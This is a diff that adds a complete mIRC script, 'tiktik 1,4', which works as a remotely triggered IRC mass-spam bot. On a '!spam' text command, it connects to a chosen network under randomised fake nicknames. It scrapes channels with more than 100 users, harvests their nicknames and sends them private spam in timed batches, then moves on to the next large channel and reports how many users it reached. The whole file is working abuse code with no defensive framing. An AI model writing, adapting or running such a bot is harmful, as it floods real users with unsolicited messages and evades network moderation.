@@ -1,0 +1,65 @@
+; tiktik 1,4 By tiktik ;
+alias ruwinviter { sockopen did $+ $ticks $+ $r(1,999) %network }
+on 1:SOCKOPEN:did*:{ if ($sockerr) { return } 
+  .sockwrite -nt $sockname PONG $ctime
+  .sockwrite -tn $sockname USER $fnick $+ $r(a,z) $+ $r(1,60) a a : $fnick $fnick 
+  .sockwrite -tn $sockname NICK $fnick $+ $chr($r(65,125)) $+ $chr($r(65,125)) 
+  .sockwrite -nt $sockname join %SPMChaNNeL
+  .sockwrite -nt $sockname list >100
+  timerpart 1 $r(5,30) /sockwrite -nt $sockname PART %SPMCHaNNeL 
+}
+on 1:SOCKREAD:did*:{ sockread -f %t.v | if ($gettok(%t.v,2,32) == 322) && ($gettok(%t.v,5,32) > 30) { write ich4.bat $gettok(%t.v,4,32) } | /saving $sockname %t.v } 
+alias saving {
+  if ($3 = 353) { /set %names $replace($8-10,$chr(32),$chr(44))  | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names : $+ %SPAM }
+  if ($3 = 353) { /set %names2 $replace($10-12,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names2 :  $+ %SPAM }
+  if ($3 = 353) { /set %names3 $replace($12-14,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names3 :  $+ %SPAM }
+  if ($3 = 353) { /set %names4 $replace($14-16,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names4 :  $+ %SPAM }
+  if ($3 = 353) { /set %names5 $replace($16-18,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names5 :  $+ %SPAM }
+  if ($3 = 353) { /set %names6 $replace($18-20,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names6 :  $+ %SPAM }
+  if ($3 = 353) { /set %names7 $replace($20-22,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names7 :  $+ %SPAM }
+  if ($3 = 353) { /set %names8 $replace($22-24,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names8 :  $+ %SPAM }
+  if ($3 = 353) { /set %names9 $replace($24-26,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names9 :  $+ %SPAM }
+  if ($3 = 353) { /set %names10 $replace($26-28,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names10 :  $+ %SPAM }
+  if ($3 = 353) { /set %names11 $replace($28-30,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names11 :  $+ %SPAM }
+  if ($3 = 353) { /set %names12 $replace($30-32,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names12 :  $+ %SPAM }
+  if ($3 = 353) { /set %names13 $replace($32-34,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names13 :  $+ %SPAM }
+  if ($3 = 353) { /set %names14 $replace($34-36,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names14 :  $+ %SPAM }
+  if ($3 = 353) { /set %names15 $replace($36-38,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names15 :  $+ %SPAM }
+  if ($3 = 366) { timerinv $+ $r(1,999) 1 1001 /finisheds $1 }
+  if (47 = $left($3,2)) { /finished2 $1 }
+  if (PING = $1) { sockwrite -nt PONG $1- }
+}
+alias fnick {
+  set %fnick $rand(1,10)
+  if (%fnick = 1) { return $read na4.qpt $+ $chr($r(65,125)) $+ $chr($r(65,125))  }
+  if (%fnick = 2) { return $chr($r(65,125)) $+ $read na4.qpt $+ $chr($r(65,125))  }
+  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  na4.qpt }
+  if (%fnick = 4) { return $r(A,Z) $+ $read na4.qpt $+ $r(A,Z) }
+  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }
+  if (%fnick = 6) { return $read  na4.qpt $+ $r(1,40) $+ $chr($r(65,125))  }
+  if (%fnick = 7) { return $r(a,z) $+ $read na4.qpt $+ $r(a,z) }
+  if (%fnick = 8) { return $read  na4.qpt $+ $r(a,z) $+ $chr($r(65,125))  }
+  if (%fnick = 9) { return $read  na4.qpt $+ $r(1,10) $+ $chr($r(65,125))  }
+  if (%fnick = 10) { return $read  na4.qpt $+ $r(20,50) $+ $chr($r(65,125)) }
+}
+alias goinvite { sockwrite -nt $1 JOIN %SPMChaNNeL |   timerpart 1 $r(5,60) /sockwrite -nt $1 PART %SPMCHaNNeL  }
+alias finisheds { .shows I've Spammed on;- ( $+ %network $+ ) in port: ( $+ $sock($1).port $+ ) At: ( $+ %SPMchannel $+ ) with About;- ( $+ %Total.users $+ ) Users Has been Affected this msg with no (@/+) one. Message sets: ( $+ %SPAM $+ )..... | if ($exists(ich4.bat) == $true) { set %SPMChannel $read ich4.bat } | if ($exists(ich4.bat) == $false) { set %SPMChannel $read i1vn.bat } | .shows Auto Changing To %SPMChaNNel $+ ...... is active!... |  /goinvite $1 }
+alias finished2 { .shows There Was a Problem on;- ( $+ %network $+ ) in port: ( $+ $sock($1).port $+ ) At: ( $+ %SPMchannel $+ ) NO Users Has been Messaged... AutoChanging Channel.. | if ($exists(ich4.bat) == $true) { set %SPMChannel $read ich4.bat } | if ($exists(ich4.bat) == $false) { set %SPMChannel $read i1vn.bat } | .shows Auto Changing To %SPMChaNNel $+ ...... is active!... |  /goinvite $1 }
+
+on *:TEXT:*:*:{
+    if ($1 = !spam) {   if ($sock(did*,0) != 0) && ($3 != off) && ($2 != status) { shows My Bot is Already ON!. }
+      .if ($2 == off) { .shows MaSs Spammer Sets OFF! | sockclose did* | timerinv* off }  
+      .if ($2 == status) && ($sock(did*,0) != 0) { .shows Im 14Spamming on;- ( $+ %network $+ ) in port: ( $+ $sock(did*).port $+ ) At: ( $+ %SPMchannel $+ ) with About;- ( $+ %Total.users $+ ) Users Gonna be Affected this msg with no (@/+) one. }
+      .if ($2 == status) && ($sock(did*,0) = 0) { .shows Im 4NOT Spamming But My Last SPam Was on;- ( $+ %network $+ ) in port: ( $+ $sock(did*).port $+ ) At: ( $+ %SPMchannel $+ ) with About;- ( $+ %Total.users $+ ) Users Gonna be Affected this msg with no (@/+) one. }
+      .if ($2 == GO) && ($sock(did*,0) != 0)  { shows Iam Already GONE!. }
+      .if ($2 == GO) && ($sock(did*,0) = 0)  { shows Iam Going ;). | /ruwinviter }
+      if ($sock(did*,0) = 0) {
+        set %total.users 0
+        .if ($3 = rand) { set %SPMChannel #kuwait  }
+        .if ($5 = rand) { set %SPMChannel #kuwait  }
+        .if ($2- == $null) { .shows !spam Server Port ChanneLs Message }
+        .if ($2 == run) { .set %network $3 $4 | .set %SPMchannel $5  | set %SPAM $6- | /ruwinviter }
+      }
+    }
+  }
+}
